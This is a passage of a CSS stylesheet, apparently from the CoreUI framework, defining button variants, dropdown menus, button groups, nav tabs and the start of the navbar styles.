                --cui-btn-active-color: rgba(44, 56, 74, 0.95);
                --cui-btn-active-bg: #b1b7c1;
                --cui-btn-active-border-color: #a7aeb9;
                --cui-btn-active-shadow: inset 0 3px 5px rgba(0, 0, 21, 0.125);
                --cui-btn-disabled-color: #9da5b1;
                --cui-btn-disabled-bg: transparent;
                --cui-gradient: none;
            }
            .btn-outline-success {
                --cui-btn-color: #2eb85c;
                --cui-btn-border-color: #2eb85c;
                --cui-btn-hover-color: rgba(44, 56, 74, 0.95);
                --cui-btn-hover-bg: #58c67d;
                --cui-btn-hover-border-color: #43bf6c;
                --cui-btn-focus-shadow-rgb: 46, 184, 92;
                --cui-btn-active-color: rgba(44, 56, 74, 0.95);
                --cui-btn-active-bg: #58c67d;
                --cui-btn-active-border-color: #43bf6c;
                --cui-btn-active-shadow: inset 0 3px 5px rgba(0, 0, 21, 0.125);
                --cui-btn-disabled-color: #2eb85c;
                --cui-btn-disabled-bg: transparent;
                --cui-gradient: none;
            }
            .btn-outline-danger {
                --cui-btn-color: #e55353;
                --cui-btn-border-color: #e55353;
                --cui-btn-hover-color: #000015;
                --cui-btn-hover-bg: #ea7575;
                --cui-btn-hover-border-color: #e86464;
                --cui-btn-focus-shadow-rgb: 229, 83, 83;
                --cui-btn-active-color: #000015;
                --cui-btn-active-bg: #ea7575;
                --cui-btn-active-border-color: #e86464;
                --cui-btn-active-shadow: inset 0 3px 5px rgba(0, 0, 21, 0.125);
                --cui-btn-disabled-color: #e55353;
                --cui-btn-disabled-bg: transparent;
                --cui-gradient: none;
            }
            .btn-outline-warning {
                --cui-btn-color: #f9b115;
                --cui-btn-border-color: #f9b115;
                --cui-btn-hover-color: #000015;
                --cui-btn-hover-bg: #c78e11;
                --cui-btn-hover-border-color: #bb8510;
                --cui-btn-focus-shadow-rgb: 249, 177, 21;
                --cui-btn-active-color: #000015;
                --cui-btn-active-bg: #c78e11;
                --cui-btn-active-border-color: #bb8510;
                --cui-btn-active-shadow: inset 0 3px 5px rgba(0, 0, 21, 0.125);
                --cui-btn-disabled-color: #f9b115;
                --cui-btn-disabled-bg: transparent;
                --cui-gradient: none;
            }
            .btn-outline-info {
                --cui-btn-color: #39f;
                --cui-btn-border-color: #39f;
                --cui-btn-hover-color: #000015;
                --cui-btn-hover-bg: #5cadff;
                --cui-btn-hover-border-color: #47a3ff;
                --cui-btn-focus-shadow-rgb: 51, 153, 255;
                --cui-btn-active-color: #000015;
                --cui-btn-active-bg: #5cadff;
                --cui-btn-active-border-color: #47a3ff;
                --cui-btn-active-shadow: inset 0 3px 5px rgba(0, 0, 21, 0.125);
                --cui-btn-disabled-color: #39f;
                --cui-btn-disabled-bg: transparent;
                --cui-gradient: none;
            }
            .btn-outline-light {
                --cui-btn-color: #ebedef;
                --cui-btn-border-color: #ebedef;
                --cui-btn-hover-color: rgba(44, 56, 74, 0.95);
                --cui-btn-hover-bg: #bcbebf;
                --cui-btn-hover-border-color: #b0b2b3;
                --cui-btn-focus-shadow-rgb: 235, 237, 239;
                --cui-btn-active-color: rgba(44, 56, 74, 0.95);
                --cui-btn-active-bg: #bcbebf;
                --cui-btn-active-border-color: #b0b2b3;
                --cui-btn-active-shadow: inset 0 3px 5px rgba(0, 0, 21, 0.125);
                --cui-btn-disabled-color: #ebedef;
                --cui-btn-disabled-bg: transparent;
                --cui-gradient: none;
            }
            .btn-outline-dark {
                --cui-btn-color: #4f5d73;
                --cui-btn-border-color: #4f5d73;
                --cui-btn-hover-color: #fff;
                --cui-btn-hover-bg: #727d8f;
                --cui-btn-hover-border-color: #616d81;
                --cui-btn-focus-shadow-rgb: 79, 93, 115;
                --cui-btn-active-color: #fff;
                --cui-btn-active-bg: #727d8f;
                --cui-btn-active-border-color: #616d81;
                --cui-btn-active-shadow: inset 0 3px 5px rgba(0, 0, 21, 0.125);
                --cui-btn-disabled-color: #4f5d73;
                --cui-btn-disabled-bg: transparent;
                --cui-gradient: none;
            }
            .btn-ghost-primary {
                --cui-btn-color: #321fdb;
                --cui-btn-hover-bg: #5141e0;
                --cui-btn-hover-border-color: #4735df;
                --cui-btn-hover-color: rgba(255, 255, 255, 0.87);
                --cui-btn-active-bg: #5b4ce2;
                --cui-btn-active-border-color: #4735df;
                --cui-btn-active-color: rgba(255, 255, 255, 0.87);
                --cui-btn-disabled-color: #321fdb;
                --cui-btn-shadow: rgba(50, 31, 219, 0.5);
            }
            .btn-ghost-secondary {
                --cui-btn-color: #9da5b1;
                --cui-btn-hover-bg: #acb3bd;
                --cui-btn-hover-border-color: #a7aeb9;
                --cui-btn-hover-color: rgba(44, 56, 74, 0.95);
                --cui-btn-active-bg: #b1b7c1;
                --cui-btn-active-border-color: #a7aeb9;
                --cui-btn-active-color: rgba(44, 56, 74, 0.95);
                --cui-btn-disabled-color: #9da5b1;
                --cui-btn-shadow: rgba(157, 165, 177, 0.5);
            }
            .btn-ghost-success {
                --cui-btn-color: #2eb85c;
                --cui-btn-hover-bg: #4dc374;
                --cui-btn-hover-border-color: #43bf6c;
                --cui-btn-hover-color: rgba(44, 56, 74, 0.95);
                --cui-btn-active-bg: #58c67d;
                --cui-btn-active-border-color: #43bf6c;
                --cui-btn-active-color: rgba(44, 56, 74, 0.95);
                --cui-btn-disabled-color: #2eb85c;
                --cui-btn-shadow: rgba(46, 184, 92, 0.5);
            }
            .btn-ghost-danger {
                --cui-btn-color: #e55353;
                --cui-btn-hover-bg: #e96d6d;
                --cui-btn-hover-border-color: #e86464;
                --cui-btn-hover-color: #000015;
                --cui-btn-active-bg: #ea7575;
                --cui-btn-active-border-color: #e86464;
                --cui-btn-active-color: #000015;
                --cui-btn-disabled-color: #e55353;
                --cui-btn-shadow: rgba(229, 83, 83, 0.5);
            }
            .btn-ghost-warning {
                --cui-btn-color: #f9b115;
                --cui-btn-hover-bg: #d49612;
                --cui-btn-hover-border-color: #c78e11;
                --cui-btn-hover-color: #000015;
                --cui-btn-active-bg: #c78e11;
                --cui-btn-active-border-color: #bb8510;
                --cui-btn-active-color: #000015;
                --cui-btn-disabled-color: #f9b115;
                --cui-btn-shadow: rgba(249, 177, 21, 0.5);
            }
            .btn-ghost-info {
                --cui-btn-color: #39f;
                --cui-btn-hover-bg: #52a8ff;
                --cui-btn-hover-border-color: #47a3ff;
                --cui-btn-hover-color: #000015;
                --cui-btn-active-bg: #5cadff;
                --cui-btn-active-border-color: #47a3ff;
                --cui-btn-active-color: #000015;
                --cui-btn-disabled-color: #39f;
                --cui-btn-shadow: rgba(51, 153, 255, 0.5);
            }
            .btn-ghost-light {
                --cui-btn-color: #ebedef;
                --cui-btn-hover-bg: #c8c9cb;
                --cui-btn-hover-border-color: #bcbebf;
                --cui-btn-hover-color: rgba(44, 56, 74, 0.95);
                --cui-btn-active-bg: #bcbebf;
                --cui-btn-active-border-color: #b0b2b3;
                --cui-btn-active-color: rgba(44, 56, 74, 0.95);
                --cui-btn-disabled-color: #ebedef;
                --cui-btn-shadow: rgba(235, 237, 239, 0.5);
            }
            .btn-ghost-dark {
                --cui-btn-color: #4f5d73;
                --cui-btn-hover-bg: #697588;
                --cui-btn-hover-border-color: #616d81;
                --cui-btn-hover-color: #fff;
                --cui-btn-active-bg: #727d8f;
                --cui-btn-active-border-color: #616d81;
                --cui-btn-active-color: #fff;
                --cui-btn-disabled-color: #4f5d73;
                --cui-btn-shadow: rgba(79, 93, 115, 0.5);
            }
            .btn-transparent {
                --cui-btn-active-border-color: transparent;
                --cui-btn-disabled-border-color: transparent;
                --cui-btn-hover-border-color: transparent;
                --cui-btn-box-shadow: none;
                --cui-btn-focus-shadow-rgb: 75, 58, 223;
            }
            .btn-link {
                --cui-btn-font-weight: 400;
                --cui-btn-color: var(--cui-link-color);
                --cui-btn-bg: transparent;
                --cui-btn-border-color: transparent;
                --cui-btn-hover-color: var(--cui-link-hover-color);
                --cui-btn-hover-border-color: transparent;
                --cui-btn-active-border-color: transparent;
                --cui-btn-disabled-color: #8a93a2;
                --cui-btn-disabled-border-color: transparent;
                --cui-btn-box-shadow: none;
                --cui-btn-focus-shadow-rgb: 75, 58, 223;
                text-decoration: underline;
            }
            .btn-link:focus-visible {
                color: var(--cui-btn-color);
            }
            .btn-lg,
            .btn-group-lg > .btn {
                --cui-btn-padding-y: 0.5rem;
                --cui-btn-padding-x: 1rem;
                --cui-btn-font-size: 1.25rem;
                --cui-btn-border-radius: 0.5rem;
            }
            .btn-sm,
            .btn-group-sm > .btn {
                --cui-btn-padding-y: 0.25rem;
                --cui-btn-padding-x: 0.5rem;
                --cui-btn-font-size: 0.875rem;
                --cui-btn-border-radius: 0.25rem;
            }
            .btn-loading {
                position: relative;
                overflow: hidden;
            }
            .btn-loading-spinner {
                opacity: 0;
                transition: margin 0.15s, opacity 0.15s, border 0.15s;
            }
            html:not([dir="rtl"]) .btn-loading-spinner {
                margin-right: 1rem;
                margin-left: -2rem;
            }
            *[dir="rtl"] .btn-loading-spinner {
                margin-left: 1rem;
                margin-right: -2rem;
            }
            @media (prefers-reduced-motion: reduce) {
                .btn-loading-spinner {
                    transition: none;
                }
            }
            .btn-loading.is-loading .btn-loading-spinner {
                width: 1rem;
                opacity: 1;
            }
            html:not([dir="rtl"]) .btn-loading.is-loading .btn-loading-spinner {
                margin-left: 0;
            }
            *[dir="rtl"] .btn-loading.is-loading .btn-loading-spinner {
                margin-right: 0;
            }
            .fade {
                transition: opacity 0.15s linear;
            }
            @media (prefers-reduced-motion: reduce) {
                .fade {
                    transition: none;
                }
            }
            .fade:not(.show) {
                opacity: 0;
            }
            .collapse:not(.show) {
                display: none;
            }
            .collapsing {
                height: 0;
                overflow: hidden;
                transition: height 0.35s ease;
            }
            @media (prefers-reduced-motion: reduce) {
                .collapsing {
                    transition: none;
                }
            }
            .collapsing.collapse-horizontal {
                width: 0;
                height: auto;
                transition: width 0.35s ease;
            }
            @media (prefers-reduced-motion: reduce) {
                .collapsing.collapse-horizontal {
                    transition: none;
                }
            }
            .dropup,
            .dropend,
            .dropdown,
            .dropstart,
            .dropup-center,
            .dropdown-center {
                position: relative;
            }
            .dropdown-toggle {
                white-space: nowrap;
            }
            .dropdown-toggle::after {
                display: inline-block;
                vertical-align: 0.255em;
                content: "";
                border-top: 0.3em solid;
                border-right: 0.3em solid transparent;
                border-bottom: 0;
                border-left: 0.3em solid transparent;
            }
            html:not([dir="rtl"]) .dropdown-toggle::after {
                margin-left: 0.255em;
            }
            *[dir="rtl"] .dropdown-toggle::after {
                margin-right: 0.255em;
            }
            html:not([dir="rtl"]) .dropdown-toggle:empty::after {
                margin-left: 0;
            }
            *[dir="rtl"] .dropdown-toggle:empty::after {
                margin-right: 0;
            }
            .dropdown-menu {
                --cui-dropdown-zindex: 1000;
                --cui-dropdown-min-width: 10rem;
                --cui-dropdown-padding-x: 0;
                --cui-dropdown-padding-y: 0.5rem;
                --cui-dropdown-spacer: 0.125rem;
                --cui-dropdown-font-size: 1rem;
                --cui-dropdown-color: rgba(44, 56, 74, 0.95);
                --cui-dropdown-bg: #fff;
                --cui-dropdown-border-color: var(--cui-border-color-translucent);
                --cui-dropdown-border-radius: 0.375rem;
                --cui-dropdown-border-width: 1px;
                --cui-dropdown-inner-border-radius: calc(0.375rem - 1px);
                --cui-dropdown-divider-bg: var(--cui-border-color-translucent);
                --cui-dropdown-divider-margin-y: 0.5rem;
                --cui-dropdown-box-shadow: 0 0.5rem 1rem rgba(0, 0, 21, 0.15);
                --cui-dropdown-link-color: #4f5d73;
                --cui-dropdown-link-hover-color: #475468;
                --cui-dropdown-link-hover-bg: #d8dbe0;
                --cui-dropdown-link-active-color: rgba(255, 255, 255, 0.87);
                --cui-dropdown-link-active-bg: #321fdb;
                --cui-dropdown-link-disabled-color: #9da5b1;
                --cui-dropdown-item-padding-x: 1rem;
                --cui-dropdown-item-padding-y: 0.25rem;
                --cui-dropdown-header-color: #8a93a2;
                --cui-dropdown-header-padding-x: 1rem;
                --cui-dropdown-header-padding-y: 0.5rem;
                position: absolute;
                z-index: var(--cui-dropdown-zindex);
                display: none;
                min-width: var(--cui-dropdown-min-width);
                padding: var(--cui-dropdown-padding-y) var(--cui-dropdown-padding-x);
                margin: 0;
                font-size: var(--cui-dropdown-font-size);
                color: var(--cui-dropdown-color);
                text-align: left;
                list-style: none;
                background-color: var(--cui-dropdown-bg);
                background-clip: padding-box;
                border: var(--cui-dropdown-border-width) solid var(--cui-dropdown-border-color);
                border-radius: var(--cui-dropdown-border-radius);
                box-shadow: 0 4px 5px 0 rgba(var(--cui-elevation-base-color, 60, 75, 100), 0.14), 0 1px 10px 0 rgba(var(--cui-elevation-base-color, 60, 75, 100), 0.12), 0 2px 4px -1px rgba(var(--cui-elevation-base-color, 60, 75, 100), 0.2);
            }
            .dropdown-menu:not([class*="border"]) {
                border: 0;
            }
            .dropdown-menu[data-coreui-popper] {
                top: 100%;
                margin-top: var(--cui-dropdown-spacer);
            }
            html:not([dir="rtl"]) .dropdown-menu[data-coreui-popper] {
                left: 0;
            }
            *[dir="rtl"] .dropdown-menu[data-coreui-popper] {
                right: 0;
            }
            .dropdown-menu-start {
                --cui-position: start;
            }
            .dropdown-menu-start[data-coreui-popper] {
                right: auto;
                left: 0;
            }
            .dropdown-menu-end {
                --cui-position: end;
            }
            .dropdown-menu-end[data-coreui-popper] {
                right: 0;
                left: auto;
            }
            @media (min-width: 576px) {
                .dropdown-menu-sm-start {
                    --cui-position: start;
                }
                .dropdown-menu-sm-start[data-coreui-popper] {
                    right: auto;
                    left: 0;
                }
                .dropdown-menu-sm-end {
                    --cui-position: end;
                }
                .dropdown-menu-sm-end[data-coreui-popper] {
                    right: 0;
                    left: auto;
                }
            }
            @media (min-width: 768px) {
                .dropdown-menu-md-start {
                    --cui-position: start;
                }
                .dropdown-menu-md-start[data-coreui-popper] {
                    right: auto;
                    left: 0;
                }
                .dropdown-menu-md-end {
                    --cui-position: end;
                }
                .dropdown-menu-md-end[data-coreui-popper] {
                    right: 0;
                    left: auto;
                }
            }
            @media (min-width: 992px) {
                .dropdown-menu-lg-start {
                    --cui-position: start;
                }
                .dropdown-menu-lg-start[data-coreui-popper] {
                    right: auto;
                    left: 0;
                }
                .dropdown-menu-lg-end {
                    --cui-position: end;
                }
                .dropdown-menu-lg-end[data-coreui-popper] {
                    right: 0;
                    left: auto;
                }
            }
            @media (min-width: 1200px) {
                .dropdown-menu-xl-start {
                    --cui-position: start;
                }
                .dropdown-menu-xl-start[data-coreui-popper] {
                    right: auto;
                    left: 0;
                }
                .dropdown-menu-xl-end {
                    --cui-position: end;
                }
                .dropdown-menu-xl-end[data-coreui-popper] {
                    right: 0;
                    left: auto;
                }
            }
            @media (min-width: 1400px) {
                .dropdown-menu-xxl-start {
                    --cui-position: start;
                }
                .dropdown-menu-xxl-start[data-coreui-popper] {
                    right: auto;
                    left: 0;
                }
                .dropdown-menu-xxl-end {
                    --cui-position: end;
                }
                .dropdown-menu-xxl-end[data-coreui-popper] {
                    right: 0;
                    left: auto;
                }
            }
            .dropup .dropdown-menu[data-coreui-popper] {
                top: auto;
                bottom: 100%;
                margin-top: 0;
                margin-bottom: var(--cui-dropdown-spacer);
            }
            .dropup .dropdown-toggle::after {
                display: inline-block;
                vertical-align: 0.255em;
                content: "";
                border-top: 0;
                border-right: 0.3em solid transparent;
                border-bottom: 0.3em solid;
                border-left: 0.3em solid transparent;
            }
            html:not([dir="rtl"]) .dropup .dropdown-toggle::after {
                margin-left: 0.255em;
            }
            *[dir="rtl"] .dropup .dropdown-toggle::after {
                margin-right: 0.255em;
            }
            html:not([dir="rtl"]) .dropup .dropdown-toggle:empty::after {
                margin-left: 0;
            }
            *[dir="rtl"] .dropup .dropdown-toggle:empty::after {
                margin-right: 0;
            }
            .dropend .dropdown-menu[data-coreui-popper] {
                top: 0;
                margin-top: 0;
            }
            html:not([dir="rtl"]) .dropend .dropdown-menu[data-coreui-popper] {
                right: auto;
                left: 100%;
                margin-left: var(--cui-dropdown-spacer);
            }
            *[dir="rtl"] .dropend .dropdown-menu[data-coreui-popper] {
                left: auto;
                right: 100%;
                margin-right: var(--cui-dropdown-spacer);
            }
            .dropend .dropdown-toggle::after {
                display: inline-block;
                vertical-align: 0.255em;
                content: "";
                border-top: 0.3em solid transparent;
                border-right: 0;
                border-bottom: 0.3em solid transparent;
                border-left: 0.3em solid;
                vertical-align: 0;
            }
            html:not([dir="rtl"]) .dropend .dropdown-toggle::after {
                margin-left: 0.255em;
            }
            *[dir="rtl"] .dropend .dropdown-toggle::after {
                margin-right: 0.255em;
            }
            html:not([dir="rtl"]) .dropend .dropdown-toggle:empty::after {
                margin-left: 0;
            }
            *[dir="rtl"] .dropend .dropdown-toggle:empty::after {
                margin-right: 0;
            }
            .dropstart .dropdown-menu[data-coreui-popper] {
                top: 0;
                margin-top: 0;
            }
            html:not([dir="rtl"]) .dropstart .dropdown-menu[data-coreui-popper] {
                right: 100%;
                left: auto;
                margin-right: var(--cui-dropdown-spacer);
            }
            *[dir="rtl"] .dropstart .dropdown-menu[data-coreui-popper] {
                left: 100%;
                right: auto;
                margin-left: var(--cui-dropdown-spacer);
            }
            .dropstart .dropdown-toggle::after {
                display: inline-block;
                vertical-align: 0.255em;
                content: "";
                display: none;
            }
            html:not([dir="rtl"]) .dropstart .dropdown-toggle::after {
                margin-left: 0.255em;
            }
            *[dir="rtl"] .dropstart .dropdown-toggle::after {
                margin-right: 0.255em;
            }
            .dropstart .dropdown-toggle::before {
                display: inline-block;
                vertical-align: 0.255em;
                content: "";
                border-top: 0.3em solid transparent;
                border-right: 0.3em solid;
                border-bottom: 0.3em solid transparent;
                vertical-align: 0;
            }
            html:not([dir="rtl"]) .dropstart .dropdown-toggle::before {
                margin-right: 0.255em;
            }
            *[dir="rtl"] .dropstart .dropdown-toggle::before {
                margin-left: 0.255em;
            }
            html:not([dir="rtl"]) .dropstart .dropdown-toggle:empty::after {
                margin-left: 0;
            }
            *[dir="rtl"] .dropstart .dropdown-toggle:empty::after {
                margin-right: 0;
            }
            .dropdown-divider {
                height: 0;
                margin: var(--cui-dropdown-divider-margin-y) 0;
                overflow: hidden;
                border-top: 1px solid var(--cui-dropdown-divider-bg);
                opacity: 1;
            }
            .dropdown-item {
                display: block;
                width: 100%;
                padding: var(--cui-dropdown-item-padding-y) var(--cui-dropdown-item-padding-x);
                clear: both;
                font-weight: 400;
                color: var(--cui-dropdown-link-color);
                text-align: inherit;
                text-decoration: none;
                white-space: nowrap;
                background-color: transparent;
                border: 0;
            }
            .dropdown-item:hover,
            .dropdown-item:focus {
                color: var(--cui-dropdown-link-hover-color);
                background-color: var(--cui-dropdown-link-hover-bg);
            }
            .dropdown-item.active,
            .dropdown-item:active {
                color: var(--cui-dropdown-link-active-color);
                text-decoration: none;
                background-color: var(--cui-dropdown-link-active-bg);
            }
            .dropdown-item.disabled,
            .dropdown-item:disabled {
                color: var(--cui-dropdown-link-disabled-color);
                pointer-events: none;
                background-color: transparent;
            }
            .dropdown-menu.show {
                display: block;
            }
            .dropdown-header {
                display: block;
                padding: var(--cui-dropdown-header-padding-y) var(--cui-dropdown-header-padding-x);
                margin-bottom: 0;
                font-size: 0.875rem;
                color: var(--cui-dropdown-header-color);
                white-space: nowrap;
            }
            .dropdown-item-text {
                display: block;
                padding: var(--cui-dropdown-item-padding-y) var(--cui-dropdown-item-padding-x);
                color: var(--cui-dropdown-link-color);
            }
            .dropdown-menu-dark {
                --cui-dropdown-color: #c4c9d0;
                --cui-dropdown-bg: #636f83;
                --cui-dropdown-border-color: var(--cui-border-color-translucent);
                --cui-dropdown-box-shadow: ;
                --cui-dropdown-link-color: #c4c9d0;
                --cui-dropdown-link-hover-color: rgba(255, 255, 255, 0.87);
                --cui-dropdown-divider-bg: var(--cui-border-color-translucent);
                --cui-dropdown-link-hover-bg: rgba(255, 255, 255, 0.15);
                --cui-dropdown-link-active-color: rgba(255, 255, 255, 0.87);
                --cui-dropdown-link-active-bg: #321fdb;
                --cui-dropdown-link-disabled-color: #9da5b1;
                --cui-dropdown-header-color: #9da5b1;
            }
            .btn-group,
            .btn-group-vertical {
                position: relative;
                display: inline-flex;
                vertical-align: middle;
            }
            .btn-group > .btn,
            .btn-group-vertical > .btn {
                position: relative;
                flex: 1 1 auto;
            }
            .btn-group > .btn-check:checked + .btn,
            .btn-group > .btn-check:focus + .btn,
            .btn-group > .btn:hover,
            .btn-group > .btn:focus,
            .btn-group > .btn:active,
            .btn-group > .btn.active,
            .btn-group-vertical > .btn-check:checked + .btn,
            .btn-group-vertical > .btn-check:focus + .btn,
            .btn-group-vertical > .btn:hover,
            .btn-group-vertical > .btn:focus,
            .btn-group-vertical > .btn:active,
            .btn-group-vertical > .btn.active {
                z-index: 1;
            }
            .btn-toolbar {
                display: flex;
                flex-wrap: wrap;
                justify-content: flex-start;
            }
            .btn-toolbar .input-group {
                width: auto;
            }
            .btn-group {
                border-radius: 0.375rem;
            }
            html:not([dir="rtl"]) .btn-group > :not(.btn-check:first-child) + .btn,
            html:not([dir="rtl"]) .btn-group > .btn-group:not(:first-child) {
                margin-left: -1px;
            }
            *[dir="rtl"] .btn-group > :not(.btn-check:first-child) + .btn,
            *[dir="rtl"] .btn-group > .btn-group:not(:first-child) {
                margin-right: -1px;
            }
            html:not([dir="rtl"]) .btn-group > .btn:not(:last-child):not(.dropdown-toggle),
            html:not([dir="rtl"]) .btn-group > .btn.dropdown-toggle-split:first-child,
            html:not([dir="rtl"]) .btn-group > .btn-group:not(:last-child) > .btn {
                border-top-right-radius: 0;
                border-bottom-right-radius: 0;
            }
            *[dir="rtl"] .btn-group > .btn:not(:last-child):not(.dropdown-toggle),
            *[dir="rtl"] .btn-group > .btn.dropdown-toggle-split:first-child,
            *[dir="rtl"] .btn-group > .btn-group:not(:last-child) > .btn {
                border-top-left-radius: 0;
                border-bottom-left-radius: 0;
            }
            html:not([dir="rtl"]) .btn-group > .btn:nth-child(n + 3),
            html:not([dir="rtl"]) .btn-group > :not(.btn-check) + .btn,
            html:not([dir="rtl"]) .btn-group > .btn-group:not(:first-child) > .btn {
                border-top-left-radius: 0;
                border-bottom-left-radius: 0;
            }
            *[dir="rtl"] .btn-group > .btn:nth-child(n + 3),
            *[dir="rtl"] .btn-group > :not(.btn-check) + .btn,
            *[dir="rtl"] .btn-group > .btn-group:not(:first-child) > .btn {
                border-top-right-radius: 0;
                border-bottom-right-radius: 0;
            }
            .dropdown-toggle-split {
                padding-right: 0.5625rem;
                padding-left: 0.5625rem;
            }
            html:not([dir="rtl"]) .dropdown-toggle-split::after,
            html:not([dir="rtl"]) .dropup .dropdown-toggle-split::after,
            html:not([dir="rtl"]) .dropend .dropdown-toggle-split::after {
                margin-left: 0;
            }
            *[dir="rtl"] .dropdown-toggle-split::after,
            *[dir="rtl"] .dropup .dropdown-toggle-split::after,
            *[dir="rtl"] .dropend .dropdown-toggle-split::after {
                margin-right: 0;
            }
            html:not([dir="rtl"]) .dropstart .dropdown-toggle-split::before {
                margin-right: 0;
            }
            *[dir="rtl"] .dropstart .dropdown-toggle-split::before {
                margin-left: 0;
            }
            .btn-sm + .dropdown-toggle-split,
            .btn-group-sm > .btn + .dropdown-toggle-split {
                padding-right: 0.375rem;
                padding-left: 0.375rem;
            }
            .btn-lg + .dropdown-toggle-split,
            .btn-group-lg > .btn + .dropdown-toggle-split {
                padding-right: 0.75rem;
                padding-left: 0.75rem;
            }
            .btn-group-vertical {
                flex-direction: column;
                align-items: flex-start;
                justify-content: center;
            }
            .btn-group-vertical > .btn,
            .btn-group-vertical > .btn-group {
                width: 100%;
            }
            .btn-group-vertical > .btn:not(:first-child),
            .btn-group-vertical > .btn-group:not(:first-child) {
                margin-top: -1px;
            }
            .btn-group-vertical > .btn:not(:last-child):not(.dropdown-toggle),
            .btn-group-vertical > .btn-group:not(:last-child) > .btn {
                border-bottom-right-radius: 0;
                border-bottom-left-radius: 0;
            }
            .btn-group-vertical > .btn ~ .btn,
            .btn-group-vertical > .btn-group:not(:first-child) > .btn {
                border-top-left-radius: 0;
                border-top-right-radius: 0;
            }
            .nav {
                --cui-nav-link-padding-x: 1rem;
                --cui-nav-link-padding-y: 0.5rem;
                --cui-nav-link-font-weight: ;
                --cui-nav-link-color: var(--cui-link-color);
                --cui-nav-link-hover-color: var(--cui-link-hover-color);
                --cui-nav-link-disabled-color: #8a93a2;
                display: flex;
                flex-wrap: wrap;
                margin-bottom: 0;
                list-style: none;
            }
            html:not([dir="rtl"]) .nav {
                padding-left: 0;
            }
            *[dir="rtl"] .nav {
                padding-right: 0;
            }
            .nav-link {
                display: block;
                padding: var(--cui-nav-link-padding-y) var(--cui-nav-link-padding-x);
                font-size: var(--cui-nav-link-font-size);
                font-weight: var(--cui-nav-link-font-weight);
                color: var(--cui-nav-link-color);
                text-decoration: none;
                transition: color 0.15s ease-in-out, background-color 0.15s ease-in-out, border-color 0.15s ease-in-out;
            }
            @media (prefers-reduced-motion: reduce) {
                .nav-link {
                    transition: none;
                }
            }
            .nav-link:hover,
            .nav-link:focus {
                color: var(--cui-nav-link-hover-color);
            }
            .nav-link.disabled {
                color: var(--cui-nav-link-disabled-color);
                pointer-events: none;
                cursor: default;
            }
            .nav-tabs {
                --cui-nav-tabs-border-width: 1px;
                --cui-nav-tabs-border-color: #c4c9d0;
                --cui-nav-tabs-border-radius: 0.375rem;
                --cui-nav-tabs-link-hover-border-color: #d8dbe0 #d8dbe0 #c4c9d0;
                --cui-nav-tabs-link-active-color: #768192;
                --cui-nav-tabs-link-active-bg: #fff;
                --cui-nav-tabs-link-active-border-color: #c4c9d0 #c4c9d0 #fff;
                border-bottom: var(--cui-nav-tabs-border-width) solid var(--cui-nav-tabs-border-color);
            }
            .nav-tabs .nav-link {
                margin-bottom: calc(-1 * var(--cui-nav-tabs-border-width));
                background: 0 0;
                border: var(--cui-nav-tabs-border-width) solid transparent;
                border-top-left-radius: var(--cui-nav-tabs-border-radius);
                border-top-right-radius: var(--cui-nav-tabs-border-radius);
            }
            .nav-tabs .nav-link:hover,
            .nav-tabs .nav-link:focus {
                isolation: isolate;
                border-color: var(--cui-nav-tabs-link-hover-border-color);
            }
            .nav-tabs .nav-link.disabled,
            .nav-tabs .nav-link:disabled {
                color: var(--cui-nav-link-disabled-color);
                background-color: transparent;
                border-color: transparent;
            }
            .nav-tabs .nav-link.active,
            .nav-tabs .nav-item.show .nav-link {
                color: var(--cui-nav-tabs-link-active-color);
                background-color: var(--cui-nav-tabs-link-active-bg);
                border-color: var(--cui-nav-tabs-link-active-border-color);
            }
            .nav-tabs .dropdown-menu {
                margin-top: calc(-1 * var(--cui-nav-tabs-border-width));
                border-top-left-radius: 0;
                border-top-right-radius: 0;
            }
            .nav-pills {
                --cui-nav-pills-border-radius: 0.375rem;
                --cui-nav-pills-link-active-color: rgba(255, 255, 255, 0.87);
                --cui-nav-pills-link-active-bg: #321fdb;
            }
            .nav-pills .nav-link {
                background: 0 0;
                border: 0;
                border-radius: var(--cui-nav-pills-border-radius);
            }
            .nav-pills .nav-link:disabled {
                color: var(--cui-nav-link-disabled-color);
                background-color: transparent;
                border-color: transparent;
            }
            .nav-pills .nav-link.active,
            .nav-pills .show > .nav-link {
                color: var(--cui-nav-pills-link-active-color);
                background-color: var(--cui-nav-pills-link-active-bg);
            }
            .nav-underline {
                border-bottom: 2px solid var(--cui-nav-underline-border-color, #c4c9d0);
            }
            .nav-underline .nav-item {
                margin-bottom: -2px;
            }
            .nav-underline .nav-link {
                color: var(--cui-nav-underline-link-color, #768192);
                border-bottom: 2px solid transparent;
            }
            .nav-underline .nav-link:hover,
            .nav-underline .nav-link:focus {
                border-color: var(--cui-nav-underline-link-active-border-color, #321fdb);
            }
            .nav-underline .nav-link.active,
            .nav-underline .show > .nav-link {
                color: var(--cui-nav-underline-link-active-color, #321fdb);
                background: 0 0;
                border-color: var(--cui-nav-underline-link-active-border-color, #321fdb);
            }
            .nav-fill > .nav-link,
            .nav-fill .nav-item {
                flex: 1 1 auto;
                text-align: center;
            }
            .nav-justified > .nav-link,
            .nav-justified .nav-item {
                flex-basis: 0;
                flex-grow: 1;
                text-align: center;
            }
            .nav-fill .nav-item .nav-link,
            .nav-justified .nav-item .nav-link {
                width: 100%;
            }
            .tab-content > .tab-pane {
                display: none;
            }
            .tab-content > .active {
                display: block;
            }
            .navbar {
                --cui-navbar-padding-x: 0;
                --cui-navbar-padding-y: 0.5rem;
                --cui-navbar-color: rgba(44, 56, 74, 0.681);
                --cui-navbar-hover-color: rgba(44, 56, 74, 0.95);
                --cui-navbar-disabled-color: rgba(44, 56, 74, 0.38);
                --cui-navbar-active-color: rgba(44, 56, 74, 0.95);
                --cui-navbar-brand-padding-y: 0.3125rem;
                --cui-navbar-brand-margin-end: 1rem;
                --cui-navbar-brand-font-size: 1.25rem;
                --cui-navbar-brand-color: rgba(44, 56, 74, 0.95);
                --cui-navbar-brand-hover-color: rgba(44, 56, 74, 0.95);
                --cui-navbar-nav-link-padding-x: 0.5rem;
                --cui-navbar-toggler-padding-y: 0.25rem;
                --cui-navbar-toggler-padding-x: 0.75rem;
                --cui-navbar-toggler-font-size: 1.25rem;
                --cui-navbar-toggler-icon-bg: url("data:image/svg+xml,%3csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 30 30'%3e%3cpath stroke='rgba%2844, 56, 74, 0.681%29' stroke-linecap='round' stroke-miterlimit='10' stroke-width='2' d='M4 7h22M4 15h22M4 23h22'/%3e%3c/svg%3e");
                --cui-navbar-toggler-border-color: rgba(0, 0, 21, 0.1);
                --cui-navbar-toggler-border-radius: 0.375rem;
                --cui-navbar-toggler-focus-width: 0.25rem;
                --cui-navbar-toggler-transition: box-shadow 0.15s ease-in-out;
                position: relative;
                display: flex;
